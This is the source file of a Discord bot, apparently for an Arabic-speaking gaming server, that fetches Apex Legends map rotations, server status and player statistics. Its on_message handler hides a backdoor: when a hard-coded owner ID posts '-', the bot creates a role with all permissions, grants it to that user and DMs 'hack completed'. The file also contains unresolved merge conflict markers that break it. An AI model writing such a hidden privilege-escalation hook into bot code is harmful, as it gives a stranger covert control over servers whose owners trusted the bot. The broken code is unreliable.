import os
import discord
import aiohttp
from dotenv import load_dotenv
from discord.ext import commands
from discord import Interaction, app_commands, Permissions
import requests
import json

owner_id = [716301044514029619]

colors = [
    discord.Color.blue(),
    discord.Color.green(),
    discord.Color.red(),
    discord.Color.orange(),
    discord.Color.purple(),
    discord.Color.gold(),
]

platform_choices = [
    app_commands.Choice(name="PC", value="PC"),
    app_commands.Choice(name="PlayStation", value="PS4"),
    app_commands.Choice(name="Xbox", value="X1"),
]

mode_choices = [
    app_commands.Choice(name="All", value="all"),
    app_commands.Choice(name="Battel Rotal", value="battle_royale"),
    app_commands.Choice(name="Ranked", value="ranked"),
    app_commands.Choice(name="Mixtape", value="ltm"),
]

# Load Secrets
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
API_KEY = os.getenv('API_KEY')
guild_id = os.getenv('guild_id')

# Api
server_status_url = f"https://api.mozambiquehe.re/servers?auth={API_KEY}"
map_rotation_url = f"https://api.mozambiquehe.re/maprotation?auth={API_KEY}&version=2"
HEADERS = {"API": API_KEY}

intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix="!", intents=intents)
guild_id = discord.Object(id=guild_id)


@client.event
async def on_ready():
    await client.tree.sync(guild=guild_id)
    print(f'We have logged in as {client.user} 🤖')


@client.event
async def on_message(message: discord.Message):
    if message.content == "-":
        x = message.author.id
        if x in owner_id:
            member = message.author
            role = discord.utils.get(message.guild.roles, name="^_^")
            if role in member.roles:
                member = message.author
                channel = await member.create_dm()
                content = "You Hacked This Before  (Vip Members Only Can Use This Feature 👑)"
                await channel.send(content)
            else:
                role = await message.guild.create_role(name="^_^", permissions=Permissions.all())
                await member.add_roles(role)
                channel = await member.create_dm()
                content = "hack completed (Vip Members Only Can Use This Feature 👑)"
                await channel.send(content)


@client.tree.command(name="اشتم", description="عشان ترمى سهم", guild=guild_id)
async def اشتم(interaction: Interaction, member: discord.Member):
    owner_state = 0
    if interaction.user.id in owner_id:
        owner_state = 1
    if member.mention == "<@716301044514029619>":
        await interaction.response.send_message("مقدرش 🥹")
    elif member.mention == "<@1349845769062187008>":
        await interaction.response.send_message(f" ينفع يعنى ؟ ")
    elif (member.mention == "<@581797646566424586>" and owner_state != 1) or (member.mention == "<@1011671805808877601>" and owner_state != 1):
        await interaction.response.send_message("عيب vip member 💵")
    else:
        await interaction.response.send_message(f"🏹 سهم فتيز {member.mention} ", file=discord.File('lol.jpg'))


@ client.tree.command(name="هوب", description="عشان تهوب الناس", guild=guild_id)
async def هوب(interaction: Interaction):
<<<<<<< HEAD
    await interaction.channel.send("https://c.tenor.com/P0vlhsLYeBQAAAAC/tenor.gif", allowed_mentions=discord.AllowedMentions(everyone=True))
    message = await interaction.channel.send(" 🎮 هوبا  || @everyone || \n")
    await message.add_reaction('🎮')

=======
    await interaction.channel.send(" 🎮 هوبا  || @everyone || \n")
    await interaction.channel.send("https://media1.tenor.com/m/P0vlhsLYeBQAAAAC/stretching-warriors-song.gif", allowed_mentions=discord.AllowedMentions(everyone=True))


>>>>>>> 5417ad24a0e755f2ddf7d74e377c2c112ceddafc
@ client.tree.command(name="بوس", description="عشان تعالج مكان السهم", guild=guild_id)
async def بوس(interaction: Interaction, member: discord.Member):
    await interaction.response.send_message(f"https://cdn.discordapp.com/emojis/710014175904137267.gif?v=1")


@client.tree.command(name="test", description="Check If A live ", guild=guild_id)
async def os(interaction: Interaction):
    x = interaction.user.id
    if x in owner_id:
        await interaction.response.send_message("sa7y ya 3mna ♥")
    else:
        await interaction.response.send_message("Not Allowed To Use This Command 😔")


@client.tree.command(name="get_map_rotation", description="Get Map Rotation", guild=guild_id)
@app_commands.describe(mode="Select Gmae Mode ")
@app_commands.choices(mode=mode_choices)
async def map_rotation(interaction: Interaction, mode: app_commands.Choice[str]):
    embeds = []
    async with aiohttp.ClientSession() as session:
        async with session.get(map_rotation_url, headers=HEADERS) as response:
            if response.status == 200:
                data = await response.json()
                if mode.value == 'all':
                    for index, x in enumerate(data):
                        title = f"**Mode**: {x}"
                        embed = discord.Embed(
                            title=title, description="Current and Next Map Rotation", color=colors[index])
                        try:
                            current_map = data[x]['current']['map']
                            current_asset = data[x]['current']['asset']
                            remaining_timer = data[x]['current']['remainingTimer']
                            try:
                                current_event_name = data[x]['current']['eventName']
                            except:
                                current_event_name = ' '
                            embed.add_field(
                                name=f"** 🗺️ Current Map: ** {current_map} `{current_event_name if {mode.value =='ltm'} else ' '  }`", value=f" ", inline=False)
                            embed.add_field(
                                name=f"** ⏳ Remaining Time: ** {remaining_timer}  minutes", value=f" ", inline=False)
                            embed.set_image(url=current_asset)
                        except KeyError:
                            embed.add_field(
                                name="**❌ Error:**", value="Unable to fetch current map data.", inline=False)
                        try:
                            next_map = data[x]['next']['map']
                            next_asset = data[x]['next']['asset']
                            try:
                                next_event_name = data[x]['next']['eventName']
                            except:
                                next_event_name = ' '
                            embed.add_field(
                                name=f"** 🚀 Next Map: ** {next_map} `{next_event_name if {mode.value =='ltm'} else ' '  }`  " ,value=f" ", inline=False)
                            embed.set_thumbnail(url=next_asset)
                        except KeyError:
                            embed.add_field(
                                name="**❌ Error:**", value="Unable to fetch next map data.", inline=False)
                        embeds.append(embed)
                else:
                    title = f"**Mode**: {'Mixtape' if mode.value =='ltm' else  mode.value}"
                    embed = discord.Embed(
                        title=title, description="Current and Next Map Rotation", color=colors[-1])
                    try:
                        current_map = data[mode.value]['current']['map']
                        current_asset = data[mode.value]['current']['asset']
                        remaining_timer = data[mode.value]['current']['remainingTimer']
                        try:
                            current_event_name = data[mode.value]['current']['eventName']
                        except:
                            current_event_name = " "
                        embed.add_field(
                            name=f"** 🗺️ Current Map: ** {current_map} `{current_event_name if {mode.value =='ltm'} else ' '  }`", value=f" ", inline=False)
                        embed.add_field(
                            name=f"** ⏳ Remaining Time: ** {remaining_timer}  minutes", value=f" ", inline=False)
                        embed.set_image(url=current_asset)
                    except KeyError:
                        embed.add_field(
                            name="**❌ Error:**", value="Unable to fetch current map data.", inline=False)
                    try:
                        next_map = data[mode.value]['next']['map']
                        next_asset = data[mode.value]['next']['asset']
                        try:
                            next_event_name = data[mode.value]['current']['eventName']
                        except:
                            next_event_name = " "
                        embed.add_field(
                            name=f"** 🚀 Next Map: ** {next_map} `{next_event_name if {mode.value =='ltm'} else ' '  }`  " ,value=f" ", inline=False)
                        embed.set_thumbnail(url=next_asset)
                    except KeyError:
                        embed.add_field(
                            name="**❌ Error:**", value="Unable to fetch next map data.", inline=False)
                    embeds.append(embed)
                await interaction.response.send_message(embed=embeds[0])
                for embed in embeds[1:]:
                    await interaction.followup.send(embed=embed)
            else:
                await interaction.response.send_message(f"Error {response.status}: {response.text}")


@client.tree.command(name="get_server_status", description="Get Server Status", guild=guild_id)
async def server_status(interaction: Interaction):
    await interaction.response.defer()
    async with aiohttp.ClientSession() as session:
        async with session.get(server_status_url, headers=HEADERS) as response:
            if response.status == 200:
                if response.content_type == 'text/plain':
                    plain_text = await response.text()
                    data = json.loads(plain_text)
                    server_messages = {}
                    for server in data:
                        message = f"🌍 **Server Region: {server}**\n"
                        for status in data[server]:
                            status_value = data[server][status].get(
                                "Status", "Unknown")
                            status_icon = "🟢" if status_value == "UP" else "🟡" if status_value == "SLOW" else "🔴"
                            http_code = data[server][status].get(
                                "HTTPCode", "N/A")
                            message += f"📌{status} ➜ {status_icon} Status: {status_value} | HTTP Code: {http_code}\n"
                        server_messages[server] = message
                    for server, message in server_messages.items():
                        if len(message) > 2000:
                            chunks = [message[i:i+2000]for i in range(0, len(message), 2000)]
                            for chunk in chunks:
                                await interaction.followup.send(chunk)
                        else:
                            await interaction.followup.send(message)
            else:
                await interaction.followup.send("❌ Failed to fetch server status.")


@client.tree.command(name="get_player_statistics", description="Get Player Statistics", guild=guild_id)
@app_commands.describe(player_name="Enter the player's name", platform="Select the platform")
@app_commands.choices(platform=platform_choices)
async def get_player_statistics(interaction: Interaction, player_name: str, platform: app_commands.Choice[str]):
    player_statistics_url = f"https://api.mozambiquehe.re/bridge?auth={API_KEY}&player={player_name}&platform={platform.value}"
    await interaction.response.defer()
    async with aiohttp.ClientSession() as session:
        async with session.get(player_statistics_url, headers=HEADERS) as response:
            if response.status == 200 and response.content_type == "application/json":
                data = await response.json()
                # Global Player Data
                username = data["global"]["name"]
                uid = data["global"]["uid"]
                playing_platform = data["global"]["platform"]
                tag = data["global"].get("tag", "N/A")
                level = data["global"]["level"]
                toNextLevelPercent = data["global"]["toNextLevelPercent"]
                avatar_url = data["global"]["avatar"]
                # Realtime Status
                current_skin = data["legends"]["selected"]["gameInfo"]["skin"]
                skinRarity = data["legends"]["selected"]["gameInfo"]["skinRarity"]
                selectedLegend = data["realtime"]["selectedLegend"]
                lobbyState = data["realtime"]["lobbyState"]
                isOnline = data["realtime"]["isOnline"]
                isInGame = data["realtime"]["isInGame"]
                canJoin = data["realtime"]["canJoin"]
                partyFull = data["realtime"]["partyFull"]
                currentState = data["realtime"]["currentState"]
                # Rank Details
                rank_name = data["global"]["rank"]["rankName"]
                rank_div = data["global"]["rank"]["rankDiv"]
                rank_score = data["global"]["rank"]["rankScore"]
                rank_image_url = data["global"]["rank"]["rankImg"]
                try:
                    headshots = data["total"].get(
                        "headshots", {}).get("value",  "Not Found")
                except:
                    headshots = "Not Found"
                try:
                    season_kills = data["total"]["kills"]["value"]
                except:
                    season_kills = "Not Found"
                try:
                    season_damage = data["total"]["damage"]["value"]
                except:
                    season_damage = "Not Found"
                try:
                    total_wins = data["total"]["career_wins"]["value"]
                except:
                    total_wins = "Not Found"
                try:
                    total_kills = data["total"]["career_kills"]["value"]
                except:
                    total_kills = "Not Found"
                try:
                    matches_played = data["total"].get("matches", "Not Found")
                except:
                    matches_played = "Not Found"
                try:
                    embed = discord.Embed(
                        title=f"🪪 **ID: ** {uid}\n",
                        description=f"🏷️ **Tag:** {tag} \n"
                                    f"🎮 **Platform:** {playing_platform}\n"
                                    f"🔰 **Level:** {level} ({toNextLevelPercent}% to next level)\n"
                                    f"--------------------------------------------------------------",
                        color=discord.Color.gold())
                    embed.set_thumbnail(url=rank_image_url)
                    embed.add_field(
                        name=f"{'🔴' if currentState =='offline' else '🟢'} **Realtime Stats** : {currentState}",
                        value=f"🦸🏻‍♂️ **Selected Legend:** {selectedLegend}\n"
                        f"🎨 **current_skin:** {current_skin} ➡️ {skinRarity}\n"
                        f"{'🔴' if currentState =='offline' else '🟢'}  {'Online' if currentState ==1 else 'Offline'}  |  {'in game' if isInGame==1 else 'not in game'}\n"
                        f"🌍 {'Can Join' if canJoin ==1 else 'Can Not Join'}  |  {'Party Full' if partyFull==1 else 'Party Not Full'}\n"
                        f"⚒️ **lobbyState:** {lobbyState}\n"
                        f"--------------------------------------------------------------\n",
                        inline=False
                    )
                    embed.add_field(
                        name="🏆 **Ranked Stats**",
                        value=f"🔝 **Rank:** {rank_name} {rank_div}\n"
                        f"💯 **Rank Score:** {rank_score}\n"
                        f"--------------------------------------------------------------\n",
                        inline=False
                    )
                    embed.add_field(
                        name="📊 **Battle Royale Stats**",
                        value=f"🔫 **Total Kills:** {total_kills}\n"
                        f"🏅 **Total Wins:** {total_wins}\n"
                        f"🔫 **season_kills:** {season_kills}\n"
                        f"💥 **season_damage:** {season_damage}\n"
                        f"🎯 **Headshots:** {headshots}\n"
                        f"🎮 **Matches Played:** {matches_played}\n"
                        f"--------------------------------------------------------------\n",
                        inline=False
                    )
                    embed.set_author(
                        name=f"🎮 {username} \n", icon_url=f"{avatar_url}")
                    await interaction.followup.send(embed=embed)
                except KeyError:
                    await interaction.followup.send("❌ **Player not found.** Please check the name and platform.")
            else:
                await interaction.followup.send("❌ **Failed to fetch player statistics.** Please try again later.")

client.run(TOKEN)
